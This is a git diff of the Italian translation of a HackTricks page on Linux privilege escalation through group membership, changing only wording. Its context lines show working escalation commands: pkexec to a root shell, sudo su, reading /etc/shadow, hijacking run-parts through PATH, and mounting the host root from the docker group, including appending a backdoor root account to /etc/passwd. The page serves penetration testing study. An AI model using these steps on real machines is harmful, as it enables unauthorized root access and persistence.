@@ -1,4 +1,4 @@
-# Gruppi Interessanti - Privesc Linux
+# Gruppi Interessanti - Linux Privesc
 
 {{#include ../../../banners/hacktricks-training.md}}
 
@@ -31,7 +31,7 @@ Questo perché tipicamente questi sono i gruppi all'interno della **politica pol
 ```bash
 cat /etc/polkit-1/localauthority.conf.d/*
 ```
-Lì troverai quali gruppi sono autorizzati a eseguire **pkexec** e **per impostazione predefinita** in alcune distribuzioni Linux i gruppi **sudo** e **admin** appaiono.
+Lì troverai quali gruppi sono autorizzati a eseguire **pkexec** e **per impostazione predefinita** in alcune distribuzioni linux i gruppi **sudo** e **admin** appaiono.
 
 Per **diventare root puoi eseguire**:
 ```bash
@@ -43,7 +43,7 @@ polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freed
 ==== AUTHENTICATION FAILED ===
 Error executing command as another user: Not authorized
 ```
-**Non è perché non hai permessi, ma perché non sei connesso senza una GUI**. E c'è una soluzione per questo problema qui: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Hai bisogno di **2 sessioni ssh diverse**:
+**Non è perché non hai permessi, ma perché non sei connesso senza una GUI**. E c'è una soluzione a questo problema qui: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Hai bisogno di **2 sessioni ssh diverse**:
 ```bash:session1
 echo $$ #Step1: Get current PID
 pkexec "/bin/bash" #Step 3, execute pkexec
@@ -66,7 +66,7 @@ Se questo è il caso, per **diventare root puoi semplicemente eseguire**:
 ```
 sudo su
 ```
-## Shadow Group
+## Gruppo Shadow
 
 Gli utenti del **gruppo shadow** possono **leggere** il file **/etc/shadow**:
 ```
@@ -86,9 +86,9 @@ $ echo $PATH
 # echo $PATH
 /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 ```
-Se riusciamo a compromettere alcuni programmi in `/usr/local`, possiamo facilmente ottenere i privilegi di root.
+Se riusciamo a dirottare alcuni programmi in `/usr/local`, possiamo facilmente ottenere i privilegi di root.
 
-Compromettere il programma `run-parts` è un modo semplice per ottenere i privilegi di root, perché la maggior parte dei programmi eseguirà un `run-parts` come (crontab, quando si effettua il login ssh).
+Dirottare il programma `run-parts` è un modo semplice per ottenere i privilegi di root, perché la maggior parte dei programmi eseguirà un `run-parts` come (crontab, quando si effettua il login ssh).
 ```bash
 $ cat /etc/crontab | grep run-parts
 17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
@@ -181,7 +181,7 @@ find / -group root -perm -g=w 2>/dev/null
 ```
 ## Gruppo Docker
 
-Puoi **montare il filesystem root della macchina host su un volume dell'istanza**, così quando l'istanza si avvia carica immediatamente un `chroot` in quel volume. Questo ti dà effettivamente i privilegi di root sulla macchina.
+Puoi **montare il filesystem root della macchina host su un volume dell'istanza**, quindi quando l'istanza si avvia, carica immediatamente un `chroot` in quel volume. Questo ti dà effettivamente i privilegi di root sulla macchina.
 ```bash
 docker image #Get images from the docker service
 
@@ -193,7 +193,7 @@ echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/pa
 #Ifyou just want filesystem and network access you can startthe following container:
 docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
 ```
-Infine, se non ti piacciono nessuna delle suggerimenti precedenti, o non funzionano per qualche motivo (firewall dell'api docker?), puoi sempre provare a **eseguire un container privilegiato e fuggire da esso** come spiegato qui:
+Infine, se non ti piacciono nessuna delle suggerimenti precedenti, o non funzionano per qualche motivo (firewall dell'api docker?), potresti sempre provare a **eseguire un container privilegiato e fuggire da esso** come spiegato qui:
 
 {{#ref}}
 ../docker-security/
